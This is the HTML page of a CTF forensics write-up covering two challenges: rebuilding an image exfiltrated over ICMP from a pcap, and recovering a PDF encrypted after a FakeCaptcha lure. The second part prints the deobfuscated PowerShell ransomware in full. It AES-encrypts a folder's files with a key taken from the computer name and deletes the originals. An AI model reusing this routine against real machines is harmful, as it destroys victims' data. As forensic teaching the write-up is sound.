@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IDEH v6 Write Up | CTF Writeups</title>
+    <link rel="icon" type="image/png" href="../assets/cursor.png">
+    <link rel="stylesheet" href="../styles/style.css">
+</head>
+<body>
+    <header>
+        <img src="../assets/title.png" alt="d33znu75 diaries">
+    </header>
+    
+    <nav class="nav-section">
+        <a href="../home.html">HOME</a>
+        <a href="../featured.html">FEATURED</a>
+        <a href="../about.html">ABOUT</a>
+    </nav>
+    
+    <div class="container">
+        <a href="../featured.html" class="back-button">← Back</a>
+        
+        <article class="writeup">
+            <h1>IDEH v6 Write Up</h1>
+            <div class="writeup-meta">
+                2025-04-13 | <span class="tag">Forensics</span><span class="tag">Malware</span>
+            </div>
+            
+            <h1 id="pingwin">pingwin</h1>
+<p><img class="lightbox-img" src="../images/ideh6/2.png" alt="" onclick="openLightbox(this)"></p>
+<p>In this challenge, we have a pcap file. Let's analyze it in Wireshark.</p>
+<p><img class="lightbox-img" src="../images/ideh6/4.png" alt="" onclick="openLightbox(this)"></p>
+<p>We have two protocols in the traffic: DNS and ICMP, which might indicate possible data exfiltration. Let's investigate further.</p>
+<p><img class="lightbox-img" src="../images/ideh6/5.png" alt="" onclick="openLightbox(this)"></p>
+<p>There's nothing suspicious in the DNS traffic—just queries to an invalid domain, <code>notgoogle.com</code>, with no data being transferred.</p>
+<p>Now, let's move on to the ICMP traffic.</p>
+<p><img class="lightbox-img" src="../images/ideh6/6.png" alt="" onclick="openLightbox(this)"></p>
+<p>The first ICMP (ping) request contains some data. In the first request, the data is a PNG file signature, indicating that an image is being exfiltrated through the protocol.</p>
+<p>Let's use the <code>tshark</code> command line to extract all data chunks and reconstruct the image file:</p>
+<div class="codehilite"><pre><span></span><code>tshark -r pingwin.pcapng -Y &quot;icmp &amp;&amp; ip.src == 192.168.42.173&quot; -T fields -e data.data | tr &#39;\n&#39; &#39;\0&#39; | xxd -r -p &gt; solve.png
+</code></pre></div>
+
+<p>And here is the image being exfiltrated:</p>
+<p><img class="lightbox-img" src="../images/ideh6/7.png" alt="" onclick="openLightbox(this)"></p>
+<p>FLAG : <code>IDEH{h0l4_qu3_p4s4_4l_kh4w4}</code></p>
+<h1 id="captcha">captcha</h1>
+<p><img class="lightbox-img" src="../images/ideh6/3.png" alt="" onclick="openLightbox(this)"></p>
+<p>In this challenge, we have an encrypted PDF file and a ZIP file containing a disk image.</p>
+<p><img class="lightbox-img" src="../images/ideh6/8.png" alt="" onclick="openLightbox(this)"></p>
+<p>Based on the challenge description, the victim had their PDF encrypted after verifying a captcha on a website.</p>
+<p>The captcha verification seems unusual, as a regular captcha verifier doesn't ask the user to open the Windows Run dialog (Windows key + R).
+This attack is known as FakeCaptcha, and it is widely spread across the web.
+Most of these attacks involve phishing the user into running a pre-copied payload via the Windows Run dialog.
+The script is typically an infostealer malware, but in this case, it's ransomware, so let's investigate further.</p>
+<p>Opening the disk image with an imaging tool (I used FTK Imager), we can see the user's files.</p>
+<p><img class="lightbox-img" src="../images/ideh6/9.png" alt="" onclick="openLightbox(this)"></p>
+<p>Great! In Windows, the history of commands used in the Run dialog is stored in the registry at the following path:
+<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</code></p>
+<p>Now, let's locate the user registry hive. The user registry is located in the root folder of the user’s directory and is called <code>ntuser.dat</code></p>
+<p><img class="lightbox-img" src="../images/ideh6/10.png" alt="" onclick="openLightbox(this)"></p>
+<p>Let's export this file from the image. To view its contents, we need <strong>Registry Explorer</strong>, a great tool from Eric Zimmerman.</p>
+<p>After opening the registry, navigate to the path:
+<code>\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</code> to find the history of commands</p>
+<p><img class="lightbox-img" src="../images/ideh6/11.png" alt="" onclick="openLightbox(this)"></p>
+<p>The malicious payload makes a web request to retrieve the actual payload from Pastebin. Visiting the URL, we can see an obfuscated PowerShell command. We need to deobfuscate it to understand its behavior.</p>
+<p><img class="lightbox-img" src="../images/ideh6/12.png" alt="" onclick="openLightbox(this)"></p>
+<p>Here is the deobfuscated version:</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">$folderPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.IO.Path<span class="o">]</span>::Combine<span class="o">([</span>System.Environment<span class="o">]</span>::GetFolderPath<span class="o">(</span><span class="s2">&quot;Desktop&quot;</span><span class="o">)</span>,<span class="w"> </span><span class="s2">&quot;random_folder_to_not_damage_the_entire_system&quot;</span><span class="o">)</span>
+<span class="k">if</span><span class="w"> </span><span class="o">(</span>-not<span class="w"> </span><span class="o">(</span>Test-Path<span class="w"> </span><span class="nv">$folderPath</span><span class="o">))</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>Write-Host<span class="w"> </span><span class="s2">&quot;Folder not found. Exiting.&quot;</span>
+<span class="w">    </span><span class="nb">exit</span>
+<span class="o">}</span>
+<span class="nv">$computerName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.Environment<span class="o">]</span>::MachineName
+<span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$computerName</span>.Length<span class="w"> </span>-lt<span class="w"> </span><span class="m">16</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$computerName</span><span class="w"> </span>+<span class="w"> </span><span class="o">(</span><span class="s1">&#39;9&#39;</span><span class="w"> </span>*<span class="w"> </span><span class="o">(</span><span class="m">16</span><span class="w"> </span>-<span class="w"> </span><span class="nv">$computerName</span>.Length<span class="o">))</span>
+<span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$computerName</span>.Substring<span class="o">(</span><span class="m">0</span>,<span class="w"> </span><span class="m">16</span><span class="o">)</span>
+<span class="o">}</span>
+Write-Host<span class="w"> </span><span class="s2">&quot;Key: </span><span class="nv">$key</span><span class="s2">&quot;</span>
+<span class="nv">$keyBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.Text.Encoding<span class="o">]</span>::UTF8.GetBytes<span class="o">(</span><span class="nv">$key</span><span class="o">)</span>
+Write-Host<span class="w"> </span><span class="s2">&quot;Key Bytes: </span><span class="k">$(</span><span class="nv">$keyBytes</span><span class="w"> </span>-join<span class="w"> </span><span class="s1">&#39;, &#39;</span><span class="k">)</span><span class="s2">&quot;</span>
+<span class="nv">$aesAlg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.Security.Cryptography.Aes<span class="o">]</span>::Create<span class="o">()</span>
+<span class="nv">$aesAlg</span>.Key<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$keyBytes</span>
+<span class="nv">$aesAlg</span>.Mode<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.Security.Cryptography.CipherMode<span class="o">]</span>::ECB
+<span class="nv">$aesAlg</span>.Padding<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.Security.Cryptography.PaddingMode<span class="o">]</span>::PKCS7
+Get-ChildItem<span class="w"> </span>-Path<span class="w"> </span><span class="nv">$folderPath</span><span class="w"> </span>-File<span class="w"> </span><span class="p">|</span><span class="w"> </span>ForEach-Object<span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="nv">$filePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$_</span>.FullName
+<span class="w">    </span><span class="nv">$encryptor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$aesAlg</span>.CreateEncryptor<span class="o">(</span><span class="nv">$aesAlg</span>.Key,<span class="w"> </span><span class="nv">$null</span><span class="o">)</span>
+<span class="w">    </span><span class="nv">$cryptoStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Security.Cryptography.CryptoStream<span class="o">(</span>
+<span class="w">        </span><span class="o">[</span>System.IO.File<span class="o">]</span>::OpenWrite<span class="o">(</span><span class="nv">$filePath</span><span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;.enc&quot;</span><span class="o">)</span>,
+<span class="w">        </span><span class="nv">$encryptor</span>,
+<span class="w">        </span><span class="o">[</span>System.Security.Cryptography.CryptoStreamMode<span class="o">]</span>::Write
+<span class="w">    </span><span class="o">)</span>
+<span class="w">    </span><span class="nv">$inputFileStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.IO.File<span class="o">]</span>::OpenRead<span class="o">(</span><span class="nv">$filePath</span><span class="o">)</span>
+<span class="w">    </span><span class="nv">$inputFileStream</span>.CopyTo<span class="o">(</span><span class="nv">$cryptoStream</span><span class="o">)</span>
+<span class="w">    </span><span class="nv">$cryptoStream</span>.FlushFinalBlock<span class="o">()</span>
+<span class="w">    </span><span class="nv">$cryptoStream</span>.Close<span class="o">()</span>
+<span class="w">    </span><span class="nv">$inputFileStream</span>.Close<span class="o">()</span>
+<span class="w">    </span>Remove-Item<span class="w"> </span><span class="nv">$filePath</span><span class="w"> </span>-Force
+<span class="o">}</span>
+</code></pre></div>
+
+<p>This PowerShell script encrypts files in a "Desktop" folder <strong>random_folder_to_not_damage_the_entire_system</strong> using AES-ECB with a key derived from the computer name.</p>
+<ul>
+<li>
+<p>If the computer name is shorter than 16 characters, it pads it with the character <code>9</code>.</p>
+</li>
+<li>
+<p>If the computer name is longer, it truncates it to 16 characters.</p>
+</li>
+<li>
+<p>The script appends <code>.enc</code> to the encrypted files and deletes the originals.</p>
+</li>
+</ul>
+<p>Now, we need the computer name to construct the encryption key. The computer name is stored in the Windows registry, specifically at <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName</code></p>
+<p>Let's retrieve the system machine hive.</p>
+<p>In the disk image, the registry hive is located in the main folder, before the user folder.</p>
+<p><img class="lightbox-img" src="../images/ideh6/13.png" alt="" onclick="openLightbox(this)"></p>
+<p>We open it again using <strong>Registry Explorer</strong> and navigate to the <strong>ComputerName</strong> path.</p>
+<p><img class="lightbox-img" src="../images/ideh6/14.png" alt="" onclick="openLightbox(this)"></p>
+<p>The computer name is <code>DESKTOP-QELPTBL</code></p>
+<p>Since the computer name is 15 characters long, the script will pad it with the character <code>9</code> to make it a 16-character string.</p>
+<p>Thus, the encryption key is <code>DESKTOP-QELPTBL9</code></p>
+<p>Now, let's decrypt the PDF file using a custom Python script.</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+<span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">unpad</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="k">def</span> <span class="nf">dec_file</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="n">decrypted</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
+    <span class="n">dec_data</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">),</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">decrypted</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">dec_data</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;decrypted and saved as </span><span class="si">{</span><span class="n">decrypted</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;DESKTOP-QELPTBL9&quot;</span>
+<span class="n">encrypted</span> <span class="o">=</span> <span class="s1">&#39;flag.pdf.enc&#39;</span>
+<span class="n">decrypted</span> <span class="o">=</span> <span class="s1">&#39;flag.pdf&#39;</span>
+<span class="n">dec_file</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="n">decrypted</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+</code></pre></div>
+
+<p>...and voilà, we got the PDF back:</p>
+<p><img class="lightbox-img" src="../images/ideh6/15.png" alt="" onclick="openLightbox(this)"></p>
+<p>FLAG : <code>IDEH{D1g174l_F0r3n51c_M4573r}</code></p>
+        </article>
+    </div>
+    
+    <!-- Lightbox Modal -->
+    <div id="lightbox" class="lightbox">
+        <span class="lightbox-close" onclick="closeLightbox()">&times;</span>
+        <img class="lightbox-content" id="lightbox-img" src="" alt="">
+    </div>
+    
+    <script>
+    function openLightbox(imgElement) {
+        const lightbox = document.getElementById('lightbox');
+        const lightboxImg = document.getElementById('lightbox-img');
+        
+        lightboxImg.src = imgElement.src;
+        lightbox.classList.add('active');
+        document.body.style.overflow = 'hidden';
+    }
+    
+    function closeLightbox() {
+        const lightbox = document.getElementById('lightbox');
+        lightbox.classList.remove('active');
+        document.body.style.overflow = 'auto';
+    }
+    
+    // Close lightbox when clicking outside the image
+    document.addEventListener('DOMContentLoaded', function() {
+        const lightbox = document.getElementById('lightbox');
+        lightbox.addEventListener('click', function(event) {
+            if (event.target === lightbox) {
+                closeLightbox();
+            }
+        });
+    });
+    
+    // Close lightbox with Escape key
+    document.addEventListener('keydown', function(event) {
+        if (event.key === 'Escape') {
+            closeLightbox();
+        }
+    });
+    </script>
+</body>
+</html>
